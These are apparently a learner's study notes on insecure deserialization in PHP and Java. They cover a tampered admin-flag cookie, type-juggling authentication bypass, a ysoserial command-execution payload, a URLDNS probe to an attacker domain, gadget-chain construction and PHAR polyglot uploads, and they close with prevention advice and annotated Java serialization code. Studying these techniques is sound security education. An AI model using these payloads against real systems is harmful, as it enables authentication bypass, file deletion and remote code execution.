
- ```readObject()``` *executes deserialization logic*

Think of it like:

- ```in``` is the machine

- ```readObject()``` is the button you press

- ```inputStream``` is the mysterious fuel you pour in


Overall, any class implementing:

```
java.io.Serializable
```

can be serialized/deserialized! When you see:

```
class User implements Serializable {
```

you’re explicitly marking that class as *eligible* for serialization. That’s the *cause.* ```Serializable``` is actually a *marker interface.* It doesn’t contain methods—no logic, no requirements. It’s basically Java saying: *“If this label is present, I’m allowed to process this class during serialization/deserialization.”*

The critical sink is:

```
readObject()
```

This is where:

- Raw bytes → real objects

- Data → behavior

If the input is malicious:

- It can instantiate unexpected classes

- It can trigger internal logic during reconstruction

- It can abuse existing code paths (gadget chains—coming soon)

During ```readObject()```:

- Java sees incoming data describing a class (e.g., ```User```)

- Checks: *“Does this class exist locally and implement ```Serializable```?”*

- If yes → **it reconstructs it automatically**

Every ```Serializable``` class in the codebase is a potential building block for an attacker.

*What to Look For (Code Review):*

Usage of:

```
readObject()
```

Classes implementing:

```
Serializable
```

Data coming from:

- HTTP requests

- Cookies

- File uploads

- External services

### Exploiting Deserialization — The Simplest Form:

Not every deserialization attack starts with complex gadget chains and black magic. Sometimes it’s embarrassingly simple. At its most basic level, exploitation can be as straightforward as *modifying the internal state of a serialized object and sending it back.*

When an application serializes an object, it preserves its **state:** properties, values, structure. If that serialized data is exposed (e.g., in cookies, requests, or APIs), an attacker can:

1. Capture it.

2. Decode or inspect it.

3. Modify interesting attributes.

4. Send it back to the application.

If the application blindly trusts it during deserialization, the attacker controls the resulting object. There are two common ways to manipulate serialized objects:

**1. Direct Byte Stream Editing:**

- Manually modify the serialized data

- Works well for *text-based formats* (like PHP)

- Requires attention to structure (length fields, types, etc.)

**2. Programmatic Object Creation:**

- Write a small script in the same language

- Construct the object with desired values

- Serialize it properly

This is often easier for:

- Binary formats (like Java serialization)

- Complex object structures

Deserialization will only succeed if the data remains **structurally valid.** For example, in PHP:

- String lengths must match actual content

- Types must remain consistent (```s```, ```i```, ```b```, etc.)

If you break the structure → deserialization fails. If you preserve it → your malicious values are accepted.

Imagine a web application that stores session data inside a serialized object. An attacker intercepts a cookie containing:

```
O:4:"User":2:{s:8:"username";s:5:"Misty";s:7:"isAdmin";b:0;}
```

Breakdown:

- ```O:4:"User"``` → Object of class ```User```

- ```2``` → Two properties

- ```username = "Misty"```

- ```isAdmin = false``` (```b:0```)

The interesting part:

```
s:7:"isAdmin";b:0;
```

That’s a boolean flag controlling privileges. The attacker modifies ```b:0``` to ```b:1``` and we have:

```
O:4:"User":2:{s:8:"username";s:5:"Misty";s:7:"isAdmin";b:1;}
```

Now imagine the application does this:

```
$user = unserialize($_COOKIE['session']);

if ($user->isAdmin === true) {
    // allow access to admin interface
}
```

What Happens?

- The server *deserializes attacker-controlled data*

- A ```User``` object is created

- The modified ```isAdmin = true``` is accepted without question and the condition passes

This exact scenario (admin flag in a cookie) is a bit too clean for real-world apps. However, it demonstrates something critical: *You don’t always need code execution to win.* Sometimes:

- Flipping a boolean

- Changing an ID

- Injecting a role

is enough to break the system. Before thinking about RCE, always ask: *“Can I change what this object represents?”*

### Exploiting Data Types — When Type Becomes a Weapon:

So far, we’ve seen how modifying *values* inside serialized objects can lead to privilege escalation. But there’s a more subtle—and often more dangerous—approach: **changing the data type itself.**

PHP is notoriously flexible when comparing values using the loose comparison operator: ```==```. This flexibility is exactly what attackers abuse. When comparing different types, PHP will attempt to **coerce them into a common type.**

**Example 1 — Normal Case:**

```
5 == "5"   // true
```

PHP converts ```"5"``` → ```5```, then compares integers.

**Example 2 — Alphanumeric Strings:**

```
5 == "5 of something"   // true
```

- PHP reads ```"5 of something"```

- Extracts leading number → ```5```

- Ignores the rest

So this becomes: ```5 == 5```.

**Example 3 — The Infamous Case (PHP ≤ 7):**

```
0 == "Example string"   // true (PHP 7 and earlier)
```

But why?

- No leading number → PHP treats string as ```0```

- So comparison becomes: ```0 == 0```.

Now combine this with **user-controlled serialized data:**

```
$login = unserialize($_COOKIE['session']);

if ($login['password'] == $password) {
    // log in successfully
}
```

An attacker modifies the serialized object: instead of a string password → injects an **integer**!

```
$login['password'] = 0;
```

If the real password is something like:

```
$password = "supersecret";
```

Then (on PHP ≤ 7):

```
0 == "supersecret"   // true
```

So: *authentication bypass without knowing the password!* This only works because **deserialization preserves the original data type.** If the value came directly from user input:

- ```0``` would be treated as ```"0"``` (string)

- The comparison would fail

But deserialization restores it as an actual integer → exploit succeeds.

PHP 8 fixed one major issue:

```
0 == "Example string"   // false (PHP 8+)
```

Strings are no longer silently converted to ```0```. However, this still works:

```
5 == "5 of something"   // true (still vulnerable)
```

So type juggling is *reduced,* not eliminated.

When modifying serialized objects, you must keep the structure valid! **Example pitfall:**

```
s:5:"admin";
```

If you change ```"admin"``` → ```"administrator"```:

```
s:13:"administrator";
```

If you forget to update the length: deserialization fails & exploit dies silently.

**Same Rule Applies to Types:**

- ```s``` → string

- ```i``` → integer

- ```b``` → boolean

If you change types, update the type marker accordingly.

**Note:** PortSwigger recommends *Hackvertor:* an extension for Burp Suite (available via the BApp Store). It lets you edit serialized or encoded data as *human-readable text.* Automatically fixes lengths, adjusts offsets and rebuilds binary formats. Without it:

- You manually fix lengths → error-prone

- Binary formats → nightmare

With it: you focus on *logic manipulation,* not formatting.

### Beyond Comparisons — Dangerous Operations:

Sometimes the vulnerability isn’t just *checking values…* It’s doing *something dangerous with them.*

**Example — Arbitrary File Deletion:**

Imagine:

```
unlink($user->image_location);
```

If ```$user``` comes from deserialization, we can modify:

```
$user->image_location = "/var/www/config.php";
```

Then trigger the “delete profile” feature and the application deletes an arbitrary file instead! Instead of just file deletion, you could try:

- Impersonating another user

- Deleting *their* data

- Hijacking logic tied to identity

This is where attacks become *context-aware instead of brute-force.* So far, we’ve seen:

- Modify values → privilege escalation

- Modify types → logic bypass

- Modify structure → unintended behavior

But all of these still rely on *manually triggering functionality.* Things get much more interesting when the application triggers dangerous behavior *automatically during deserialization.*

**Magic Methods:** That’s where we’re heading next!

### Magic Methods (Where Data Turns Into Behavior):

Magic methods are special methods that are invoked automatically when specific events occur in an object’s lifecycle. You don’t call them manually. The language runtime does. They are typically recognizable by their double-underscore naming:

```
__construct()
__wakeup()
__destruct()
```

Developers use magic methods to define **automatic behavior:**

- Object creation

- Initialization

- Cleanup

- Serialization/deserialization hooks

*Note:* A hook in programming refers to techniques that allow developers to intercept and modify the behavior of software components, such as applications or operating systems, by capturing function calls or events. Hooks enable customization and debugging by allowing additional code to run at specific points in a program's execution.

For example:

```
class User {
    public function __construct() {
        // runs automatically when object is created
    }
}
```

This is similar to Python’s:

```
class User:
    def __init__(self):
        # runs when object is created
```

**Additional Notes and Expanding the Python Comparison:**

***Object Creation:***

- PHP: ```__construct()```

- Python: ```__init__()```

Important nuance: ```__init__()``` is **not** the constructor in Python—it initializes an already created object. The actual constructor is ```__new__()```. But in practice, ```__init__()``` is where most logic lives.

***Deserialization Hooks:***

- PHP: ```__wakeup()```

- Python: ```__setstate__()``` (used during unpickling)

Both are triggered when an object is reconstructed from a serialized form.

***Object Destruction:***

- PHP: ```__destruct()```

- Python: ```__del__()```

Triggered when:

- Object goes out of scope

- Garbage collection occurs

**Important Insight:**

Python’s ```pickle``` is already considered dangerous by design. PHP (historically) made dangerous behavior feel completely normal and invisible. In the context of insecure deserialization, two PHP magic methods matter most:

1. ```__wakeup()```:

```
public function __wakeup() {
    // runs automatically during unserialize()
}
```

- Triggered *immediately when an object is deserialized*

- Executes *before* the object is fully “trusted” or used

Think of ```__wakeup()``` as: *“Code that runs the moment an object returns from the dead.”*

*Typical Legitimate Use:*

- Reconnect to a database

- Reinitialize resources

- Restore internal state

If the method contains something like:

```
eval($this->data);
```

or:

```
file_get_contents($this->url);
```

Then any attacker-controlled property becomes a trigger for execution.

Overall, ```__wakeup()``` gives attackers:

- A *guaranteed execution point*

- Direct access to *controlled object properties*

2. ```__destruct()```:

```
public function __destruct() {
    // runs when object is destroyed
}
```

Triggered at:

- End of script

- When no references remain

*The Core Danger:* You feed ```unserialize()``` attacker-controlled data, PHP reconstructs the object and silently executes embedded logic. No explicit function call required.

***Magic Methods Are Not Vulnerabilities (By Themselves)!***

Magic methods are just tools. They become dangerous only when:

- They process *untrusted data*

- That data comes from *deserialization*

#### Java Equivalent — Hidden Entry Point:

In Java, the same concept exists—but looks less obvious. Standard flow:

```
ObjectInputStream in = new ObjectInputStream(inputStream);
Object obj = in.readObject();
```

*What Most People Miss?* A class can define its own:

```
private void readObject(ObjectInputStream in)
    throws IOException, ClassNotFoundException {

    // custom deserialization logic
}
```

In short, ```readObject()``` in Java = ```__wakeup()``` in PHP. Both are:

- Automatic

- Invisible in normal flow

- Executed during object reconstruction

*The Critical Insight:*

During deserialization the application gives the object a chance to *run code before it's fully trusted.* This is incredibly dangerous because input is attacker-controlled, execution happens automatically and validation often hasn’t occurred yet!

*And Why This Is the Gateway to Advanced Exploits?*

Up until now, attacks required:

- Triggering functionality manually

- Flipping values

- Abusing logic

Magic methods change the game: they allow attackers to execute code *without any explicit trigger.*

Before: *“Can I control this value?”*

Now: *“Can I make the application execute something just by deserializing my object?”*

Overall, magic methods are like hidden trapdoors in the codebase. Most of the time, they’re harmless. But in the presence of insecure deserialization they become automatic execution points where attacker-controlled data is transformed into action without permission, without visibility, and without resistance.

### Injecting Arbitrary Objects:

So far, we’ve looked at modifying **existing serialized objects.** But the real power of insecure deserialization comes from something much more dangerous: *injecting entirely different object types.*

In object-oriented programming, an object’s **class** determines what code it can execute. That means:

- Different classes → different methods

- Different methods → different behaviors

So if an attacker can control *which class gets instantiated,* they can influence what code runs (sometimes instantly).

Most deserialization mechanisms do *not verify* what class is being deserialized or whether that class is expected in this context. In other words, when the application deserializes data, it doesn’t ask: *“Is this the type of object I expected?”* It just does: *“Oh, this says it’s a ```SomeClass``` object? Cool, let me build that.”*

Even if the application expects something like:

```
User
```

You can send:

```
AdminLogger
FileDeleter
DatabaseConnector
```

As long as:

- The class exists on the server

- It’s serializable

It will be instantiated. Yes, the application might later crash or throw an error because: *“Wait… this isn’t a User object.”* But by then *the object has already been created. Magic methods may have already executed.* If the attacker has access to source code (or can infer it), they will:

1. **Enumerate available classes**

2. Look for magic methods (```__wakeup```, ```__destruct```, etc.)

3. Identify dangerous operations: file access, command execution or database queries

4. Build a serialized object of that class

5. Inject it into the deserialization flow

At this point, a single class might already be enough. But often, one class alone isn’t powerful enough. That’s where things evolve.

### Gadget Chains — Assembling the Spell:

A gadget is simply a piece of existing code that does something useful for the attacker. Not necessarily malicious by itself. A class might take input and pass it somewhere else. Another class might execute that input. Individually: harmless. Together: dangerous.

In other words, a *gadget chain* is a sequence of method calls across multiple objects that transforms attacker-controlled data into a dangerous action. The attacker does *not write new code.* Everything already exists inside the application. The attacker only:

- Chooses objects

- Sets their properties

- Lets the application connect the dots

#### The “Kick-Off Gadget” and “Sink Gadget”:

To start the chain, attackers rely on a magic method triggered during deserialization. This is often called: *the kick-off gadget.* For example:

1. Deserialization begins

2. ```__wakeup()``` or ```__destruct()``` runs

3. That method calls another method

4. That method passes data to another object

5. Eventually, data reaches *a dangerous sink*

The final step in the chain is a **sink gadget.** This is where real damage happens:

- ```eval()```

- ```exec()```

- ```file_delete()```

- database queries

Simple exploits (like flipping ```isAdmin```) are nice for learning. But in real applications direct vulnerabilities are rare. Instead, attackers rely on:

- Existing code complexity

- Large class ecosystems

- Hidden interactions

Most real-world insecure deserialization exploits *require gadget chains.* And the more complex the application, the more gadgets exist. Before: *“Can I control this object?”* Now: *“Can I turn the entire codebase into a chain reaction?”* With arbitrary object injection you’re no longer limited to what the application *intended* to do. With gadget chains you start using the application *against itself.*

### Working with Pre-Built Gadget Chains:

Manually building gadget chains is painful. It requires:

- Deep understanding of the codebase

- Careful tracing of object interactions

- A lot of trial and error

And without source code? It’s often borderline impossible. But here’s the good news: *you usually don’t need to build gadget chains from scratch.* Why? Because modern applications rely heavily on third-party libraries, frameworks and shared components. And many of these already contain *known exploitable gadget chains.* If a gadget chain works against one application using a library, it will likely work against *any* application using that same library.

**ysoserial:**

This is one of the most well-known tools for Java deserialization attacks. It provides a collection of *pre-built gadget chains* and lets you:

- Choose a chain (based on suspected library)

- Provide a command

- Generate a serialized payload

Example usage:

```
java -jar ysoserial-all.jar CommonsCollections1 "calc.exe"
```

This generates a payload that:

- Uses the ```CommonsCollections1``` gadget chain

- Executes ```calc.exe``` when deserialized

**Java 16+ Compatibility:**

Modern Java versions introduced stronger encapsulation via the module system. This breaks many older exploitation tools unless you explicitly allow access.

*The Flags Explained:*

```
--add-opens=java.xml/...=ALL-UNNAMED
```

These flags mean: *“Hey Java, open this normally protected internal package so tools like ysoserial can access it.”* Many gadget chains rely on:

- Internal Java classes

- Reflection

- Restricted APIs

Java 16+ says: *“Nope, that’s private.”* So we override it with ```--add-opens```.

#### Detection Gadget Chains (No RCE Needed):

Not all chains are about code execution. Some are used purely to *detect deserialization.*

**URLDNS Chain:**

- Triggers a DNS lookup

- Does NOT depend on a specific vulnerable library

- Works across many Java versions and many environments

You generate a payload pointing to: ```attacker-controlled-domain.com``` When deserialized, server performs a DNS lookup. This gives you *out-of-band confirmation* that deserialization occurred.

**JRMPClient Chain:**

Another detection-focused gadget. It forces the server to attempt a *TCP connection* after you provide an IP address (not hostname). Use two payloads:

- Local IP (fast response)

- External blocked IP (slow/hanging response)

Interpretation:

- Fast → immediate failure

- Slow → connection attempt blocked

Timing difference = proof of deserialization!

**PHP Generic Gadget Chains (PHPGGC):**

For PHP environments, this is the equivalent of ysoserial. It provides pre-built gadget chains for:

- Laravel

- Symfony

- Monolog (and more)

PHP apps are often framework-heavy and library-rich, which makes them perfect gadget chain playgrounds. This is important enough to burn into memory: *The vulnerability is NOT the gadget chain.* The vulnerability is: *deserializing untrusted data.*

Gadget chains are just tools. They help you exploit the vulnerability and shape how your input flows. But even if all known chains were removed, the vulnerability would still exist.

*When No Tool Exists?*

Sometimes:

- No ready-made chain fits

- No tool supports the framework

Then you:

- Search for public exploits

- Study similar chains

- Adapt manually

Of course, this requires basic language understanding, ability to tweak object structure and (sometimes) manual serialization. Even partial examples can reveal patterns you can reuse (still easier than starting from zero). Pre-built gadget chains turn exploitation from *deep reverse engineering* into *strategic guessing + smart reuse.*

### Creating Your Own Exploit:

When pre-built gadget chains and public exploits fall short, you step into the role of the attacker who *builds the chain from scratch.* This is where understanding becomes power.

**Step 1 — Find the Entry Point (Kick-Off Gadget):**

With source code access, your first objective is simple: *find a class with a magic method triggered during deserialization!* Examples:

- PHP → ```__wakeup()```, ```__destruct()```

- Java → ```readObject()```

Inside these methods, ask:

- Does it use object properties (```$this->...```)?

- Are those properties attacker-controllable?

- Does it perform any sensitive operations?

*Best Case Scenario!* You find something like:

```
public function __wakeup() {
    system($this->cmd);
}
```

That’s a *direct sink.* No chain needed. Instant win.

*Additional Notes:*

1. Object Creation:

```
Object payload = new ExploitClass();
```

- You create an instance of a class (```ExploitClass```)

- You set its internal properties to values you control

For example:

```
ExploitClass obj = new ExploitClass();
obj.command = "calc.exe";
```

2. Serialization:

```
serialize(payload);
```

In real Java, this would be done using ```ObjectOutputStream```. Example:

```
ObjectOutputStream out = new ObjectOutputStream(outputStream);
out.writeObject(payload);
```

Overall, instead of doing this manually:

```
ac ed 00 05 73 72 00 ...
```

—which is: unreadable, error-prone and painful, you do this: *“build a normal object → let Java turn it into valid serialized bytes.”*

In other words, that snippet is really shorthand for: *“programmatically generate a malicious serialized object instead of hand-editing bytes.”* Before: *“I need to craft a payload.”* Now: *“I just build an object in code and let serialization weaponize it for me.”*

This also means you can rapidly test variations of your exploit just by changing object properties in code. No hex editing. No headaches.

**Step 2 — Build the Chain (If No Direct Sink):**

Most of the time, it won’t be that easy. Instead, the magic method becomes your *kick-off gadget.*

*The Process!* Follow the execution flow like a detective:

- Start at the magic method

- Identify methods it calls

- Trace where data flows

- Repeat recursively

*Questions to Ask at Each Step:*

- Where does my controlled data go next?

- Is it transformed, filtered, or passed along?

- Does it eventually reach file operations, command execution or database queries?

*Two Possible Outcomes:*

- Dead end → abandon this path

- Reach a dangerous operation → *sink gadget found!*

**Step 3 — Identify the Sink:**

A *sink gadget* is where real damage happens. Examples:

- ```exec()``` / ```system()```

- ```eval()```

- file deletion (```unlink```)

- file inclusion

- network calls

*The Goal:* Get your controlled data from the entry point → into the sink!

**Step 4 — Construct the Payload Object:**

Once the chain is mapped, you need to recreate it as a serialized object.

*For Text-Based Formats (PHP),* this is relatively straightforward:

```
O:4:"User":1:{s:3:"cmd";s:2:"id";}
```

Just ensure:

- Correct property names

- Correct types

- Correct length values

*For Binary Formats (Java),* things get unpleasant:

- Not human-readable

- Structure is strict

- Small mistakes break everything

Instead of editing raw bytes, write code in the target language to generate the payload. Example (conceptual Java):

```
Object payload = new ExploitClass();
serialize(payload);
```

This ensures valid structure, correct encoding, less frustration.

**Step 5 — Look for Secondary Impact:**

Here’s where things get interesting. While building your chain, you might notice:

- Unexpected file paths

- Unvalidated inputs

- Weak assumptions

This means your deserialization exploit can trigger *other vulnerabilities.* Examples: path traversal, SSRF, command injection.

**Step 6 — Scale the Chain:**

Short chains: easier to build & lower impact. Long chains: harder to discover & potentially devastating. Goal: reach a chain that enables *remote code execution (RCE).* This often requires multiple object interactions, careful property control and precise execution flow.

Before: *“Find a vulnerability.”* Now: *“Trace how data flows through the system until it becomes dangerous.”*

Building your own exploit is not about memorizing tricks. Instead, *you should understand how code behaves when you bend its assumptions.*

When tools fail and no ready-made chain exists, the application itself becomes your toolkit. Every class: *a potential gadget.* Every method: *a possible step.* Every assumption: *something to break.*

### PHAR Deserialization:

So far, we have mainly explored scenarios where an application explicitly calls:

```
unserialize()
```

However, PHP contains a much sneakier attack surface: *deserialization can sometimes occur implicitly, without any visible call to ```unserialize()``` at all!* This is where *PHAR deserialization* enters the scene.

A *PHAR (PHP Archive)* is essentially a packaged archive format for PHP applications. Think of it like ```.jar``` in Java, ```.zip``` with PHP-specific behavior, a self-contained bundle of files and metadata. PHAR files can contain PHP scripts, assets, metadata, manifest information. And here’s the dangerous part: *the metadata inside a PHAR archive can contain serialized PHP objects.*

PHP supports special stream wrappers for accessing resources using URL-like syntax. Examples:

- ```http://```

- ```ftp://```

- ```file://```

- ```phar://```

For instance:

```
file_get_contents("phar://archive.phar/test.txt");
```

This tells PHP: *“treat this file as a PHAR archive and access its contents.”* According to PHP’s internals, when PHP interacts with a ```phar://``` stream, it automatically processes the PHAR metadata. If that metadata contains serialized objects, PHP deserializes them automatically. This means you can trigger deserialization **without the application ever calling ```unserialize()``` directly.** That’s what makes PHAR deserialization so sneaky.

**Filesystem Functions Become Attack Surface:**

Any filesystem-related operation using a ```phar://``` path can potentially trigger deserialization. Examples:

```
file_exists()
fopen()
include()
file_get_contents()
```

At first glance:

```
file_exists()
```

looks harmless. It merely checks: *“does this file exist?”* Example:

```
if (file_exists($path)) {
    // proceed
}
```

If attacker-controlled input reaches:

```
phar://malicious.phar
```

Then PHP processes the PHAR metadata BEFORE even answering whether the file exists. So this innocent-looking check can silently trigger:

- ```__wakeup()```

- ```__destruct()```

- gadget chains

Developers often protect obviously risky functions:

```
include()
eval()
```

But they may completely overlook ```file_exists()``` because it *appears* harmless. To exploit this technique, the attacker usually needs a way to upload a PHAR archive to the server. Applications often restrict uploads to ```.jpg```, ```.png``` or images only. So attackers create a *polyglot file.* This is a file that is valid image data AND valid PHAR data simultaneously.

The application sees:

```
cute_cat.jpg
```

But PHP sees:

```
phar://cute_cat.jpg
```

And happily processes PHAR metadata. This is the subtle trick: *PHP stream wrappers care about the file content and stream handler—not the extension.* So even if the file is named:

```
image.jpg
```

PHP can still interpret it as a PHAR archive via:

```
phar://image.jpg
```

*Exploitation Flow:*

1. Upload malicious PHAR disguised as JPG

2. Inject serialized metadata into PHAR

3. Force application to access it using phar://

4. PHP automatically deserializes metadata

5. Magic methods execute

6. Gadget chain begins

**Magic Methods Still Apply!**

As long as the target application contains the relevant class definitions:

- ```__wakeup()```

- ```__destruct()```

can still trigger normally.

Before: *“I need access to ```unserialize()```.”* Now: *“I just need the application to touch a ```phar://``` stream.”* Why PHAR deserialization is feared? Because it:

- Hides deserialization behind innocent filesystem operations

- Bypasses assumptions during code review

- Often survives partial security hardening

With PHAR deserialization the application may never explicitly deserialize anything, yet deserialization still happens behind the curtain. And suddenly, even checking whether a file exists can become the first step toward remote code execution.

### Exploiting Deserialization via Memory Corruption:

So far, we have mainly focused on:

- Magic methods

- Gadget chains

- Logic abuse

However, insecure deserialization can sometimes remain exploitable even when no useful gadget chains exist and no dangerous application logic is reachable. How? Through memory corruption vulnerabilities inside the deserialization mechanism itself. Deserialization engines are often extremely complex, performance-critical and deeply integrated into language runtimes. As a result, bugs in the deserializer itself can sometimes be exploited directly. Memory corruption vulnerabilities can lead to:

- Crashes

- Denial of Service (DoS)

- Arbitrary memory access

- Remote Code Execution (RCE)

*Why Deserializers Are Attractive Targets?*

Functions like ```unserialize()``` process:

- deeply nested structures

- object references

- type metadata

- recursive relationships

This creates a huge attack surface. These functions were never designed with the assumption: *“Attackers will fully control the input.”* So historically:

- security hardening was limited

- malformed edge cases were overlooked

- parser complexity became dangerous

This is important conceptually: *the vulnerability is not necessarily in the application code anymore.* Instead: *the vulnerability may exist in the language runtime itself.*

#### Preventing Insecure Deserialization:

At this point, one thing becomes painfully clear: *deserializing untrusted input is inherently risky.* The safest approach is simple: *never deserialize untrusted user input unless absolutely necessary.* Why? Because successful exploitation can lead to:

- authentication bypass

- file operations

- server compromise

- full remote code execution

And defending against every possible chain or edge case is extremely difficult. If deserialization must occur, ensure the data has not been tampered with. Use digital signatures, HMAC validation and cryptographic integrity checks. Validation must happen **BEFORE deserialization begins!** Otherwise, malicious objects may already execute and magic methods may already trigger. At that point the damage may already be done.

*Avoid Generic Serialization Formats!*

Generic serialization mechanisms often expose:

- private properties

- internal state

- implementation details

This increases both attack surface and information leakage. Better alternative is to use:

- controlled serialization formats

- explicit field mappings

- custom serialization logic

This allows developers to decide what data is included and what object structure is permitted. A very common mistake is thinking: *“We removed the dangerous chain, so we’re safe.”* No, not really. Again, the issue is deserializing attacker-controlled data in the first place. Gadget chains are merely exploitation techniques and pathways to impact. Also, modern applications depend on:

- frameworks

- libraries

- plugins

- nested dependencies

Which creates enormous object ecosystems and unpredictable gadget interactions. Even if you eliminate known chains:

- new ones may emerge

- dependencies may reintroduce them

- runtime vulnerabilities may still exist

Even a perfectly audited codebase may still become vulnerable because:

- a dependency changes

- a new gadget chain is discovered

- a runtime memory corruption bug appears

At the beginning of this journey, insecure deserialization looked like *unsafe object handling.* Now we can see it more clearly: *it is the act of letting user-controlled data reconstruct executable program state.* That is why the impact can become so catastrophic. Insecure deserialization is dangerous because it blurs the boundary between *data* and *behavior.* The moment an application allows untrusted input to:

- instantiate objects

- influence execution flow

- trigger hidden logic

…the attacker is no longer merely sending input. Instead, they are participating in the application’s internal execution process itself. And once that boundary collapses, the application may begin executing the attacker’s intentions using its own trusted code.

## OWASP’s Take on Insecure Deserialization:

As I continued following the trail and piecing together a broader understanding of insecure deserialization, I decided to stop by OWASP’s article on the subject in hopes of uncovering additional insights. Although considerably shorter than the PortSwigger material, it still contains several interesting code snippets worth dissecting more closely. In the following sections, I will expand on these examples and use them as an opportunity to deepen my understanding of the underlying concepts.

### Core Concepts Revisited:

Insecure deserialization is a vulnerability that occurs when an application accepts serialized data from an untrusted source and reconstructs it without properly validating its integrity or intent. At first glance, deserialization may appear to be nothing more than:

- loading data

- restoring state

- rebuilding objects

In reality, however, deserialization often reconstructs not only *data,* but also *behavior.* This is what makes the vulnerability so dangerous. To understand the risk, we first need to understand the underlying process. Serialization is the process of converting an object into a format that can be:

- stored on disk

- cached in memory

- transmitted across a network

The resulting serialized representation preserves object properties, internal state and structural relationships.

Deserialization is the reverse process. The application takes serialized data and:

- interprets it

- reconstructs the original object

- restores its internal state

Many programming languages provide built-in serialization systems. Unlike simpler formats such as JSON or XML, native serialization formats often support:

- full object reconstruction

- custom deserialization logic

- object references

- private/protected attributes

- automatic method invocation

These features are convenient for developers but they also dramatically expand the attack surface. When an application deserializes untrusted input, an attacker may gain influence over:

- object creation

- application logic

- execution flow

- hidden internal behaviors

Depending on the language and environment, this can lead to authentication bypass, arbitrary file operations, denial of service (DoS) and remote code execution (RCE).

### Java Serialization Example — Saving a Cookie Object:

The following example demonstrates how a Java application might serialize an object and store it on disk:

```
import java.io.*;

public class SerializeCookie {

    public static void main(String[] args) {

        Cookie cookieObj = new Cookie();
        cookieObj.setValue("alice");

        try {

            FileOutputStream fos =
                new FileOutputStream("cookies.ser");

            ObjectOutputStream oos =
                new ObjectOutputStream(fos);

            oos.writeObject(cookieObj);

            oos.close();

        } catch (IOException e) {

            e.printStackTrace();

        }
    }
}
```

**Breakdown:**

```
public class SerializeCookie
```

This defines a *class.* The ```public``` keyword means *“this class can be accessed from outside.”* In Java:

- class names typically use PascalCase

- file names usually match the class name

So this would likely live in:

```
SerializeCookie.java
```

And now, the ```main()``` method:

```
public static void main(String[] args)
```

This is simply the starting point of the Java program. Equivalent mental model (in Python):

```
if __name__ == "__main__":
```

So, ```public``` means *accessible from outside the class* and ```static``` means *“this method belongs to the class itself, not to a specific object.”* Java can run it without first creating an instance of ```SerializeCookie```.

Also, ```void``` means *“this function returns nothing.”* To compare (and remind myself):

```
int add()
```

returns an integer. While this one:

```
void print()
```

returns nothing!

```
String[] args
```

An array of command-line arguments. Example:

```
java SerializeCookie hello world
```

would populate:

```
args[0] = "hello"
args[1] = "world"
```

*Creating the Cookie Object:*

```
Cookie cookieObj = new Cookie();
```

What happens here? Left side:

```
Cookie cookieObj
```

- ```Cookie``` → object type/class

- ```cookieObj``` → variable name

Right side:

```
new Cookie()
```

Creates a new instance of the ```Cookie``` class. Meaning: *“Create a new Cookie object and store it inside the variable ```cookieObj```.”*

*Setting the Cookie Value:*

```
cookieObj.setValue("alice");
```

This calls the ```setValue()``` method belonging to the object. Equivalent idea in Python:

```
cookieObj.value = "alice"
```

*FileOutputStream — Writing Raw Data:*

```
FileOutputStream fos =
    new FileOutputStream("cookies.ser");
```

This creates a stream for writing bytes into a file. Also, ```"cookies.ser"``` is the output file name and ```.ser``` commonly indicates serialized Java data.

*ObjectOutputStream — Serialization Layer:*

```
ObjectOutputStream oos =
    new ObjectOutputStream(fos);
```

This wraps the file stream with serialization capabilities. Important relationship:

```
FileOutputStream
    ↓
ObjectOutputStream
```

- ```FileOutputStream``` → knows how to write bytes to disk

- ```ObjectOutputStream``` → knows how to convert objects into bytes

Together they serialize objects into files.

*The Critical Line — ```writeObject()```:*

```
oos.writeObject(cookieObj);
```

This is the core serialization operation. What happens here? Java:

1. Examines the object

2. Extracts its state

3. Converts it into serialized binary data

4. Writes it into ```cookies.ser```

The file now contains a serialized representation of the ```Cookie``` object.

*Closing the Stream:*

```
oos.close();
```

Important for flushing remaining data and releasing file resources.

*Error Handling — ```try/catch```:*

```
try {
    ...
} catch (IOException e) {
    e.printStackTrace();
}
```

We need this because file operations can fail:

- missing permissions

- disk issues

- invalid paths

So Java forces developers to handle potential exceptions. ```IOException``` represents input/output related errors while ```e.printStackTrace()``` prints:

- error details

- stack trace

- debugging information

To conclude, at first glance this code simply stores a cookie object. But conceptually, it demonstrates something critical: *Java can convert live objects into portable serialized data* and if that data later becomes attacker-controlled, the application may reconstruct malicious objects during deserialization.

**The Bigger Picture:**

This line:

```
writeObject(cookieObj);
```

creates the serialized payload. Its counterpart:

```
readObject()
```

rebuilds the object later. And that reconstruction phase is exactly where insecure deserialization vulnerabilities emerge. Serialization: *“freeze this object into bytes.”* Deserialization: *“bring this object back to life.”*

### Java Deserialization Example — Reading the Cookie Object:

The following example demonstrates how a Java application deserializes a previously saved object:

```
import java.io.*;

public class DeserializeCookie {

    public static void main(String[] args) {

        try {

            FileInputStream fis =
                new FileInputStream("cookies.ser");

            ObjectInputStream ois =
                new ObjectInputStream(fis);

            Cookie cookieObj =
                (Cookie) ois.readObject();

            System.out.println(cookieObj.getValue());

        } catch (IOException | ClassNotFoundException e) {

            e.printStackTrace();

        }
    }
}
```

This program:

1. Opens the serialized file

2. Reads serialized bytes

3. Reconstructs the original object

4. Uses the reconstructed object normally

**Breakdown:**

*```FileInputStream```:*

```
FileInputStream fis =
    new FileInputStream("cookies.ser");
```

This opens the serialized file for reading. Previously:

```
FileOutputStream
```

wrote bytes to disk. Now:

```
FileInputStream
```

reads bytes from disk.

*```ObjectInputStream```:*

```
ObjectInputStream ois =
    new ObjectInputStream(fis);
```

This wraps the raw file stream with deserialization capabilities. Relationship:

```
FileInputStream
        ↓
ObjectInputStream
```

- ```FileInputStream``` → reads raw bytes

- ```ObjectInputStream``` → interprets those bytes as serialized Java objects

*The Critical Line — ```readObject()```:*

```
Cookie cookieObj =
    (Cookie) ois.readObject();
```

This is the dangerous operation. Java:

- Reads serialized binary data

- Parses object structure

- Reconstructs the object

- Restores its fields/state

- Instantiates the object in memory

If the serialized data is attacker-controlled, the attacker influences what object gets reconstructed. And potentially: what methods execute, what code paths trigger and what internal behaviors occur.

*Understanding ```(Cookie)``` — Type Casting:*

This part confused me a bit:

```
(Cookie)
```

Why is it needed? Because:

```
readObject()
```

returns a generic:

```
Object
```

Java only knows: *“I reconstructed some object.”* This:

```
(Cookie)
```

tells Java: *“treat this object as a Cookie.”* Think:

```
cookieObj = readObject()
```

*```System.out.println()```:*

```
System.out.println(cookieObj.getValue());
```

This calls:

```
getValue()
```

- Retrieves the cookie value

- Prints it to console

- ```System.out.println``` is equivalent to ```print()``` in Python

*Exception Handling:*

```
catch (IOException | ClassNotFoundException e)
```

This catches file-related errors and deserialization-related errors.

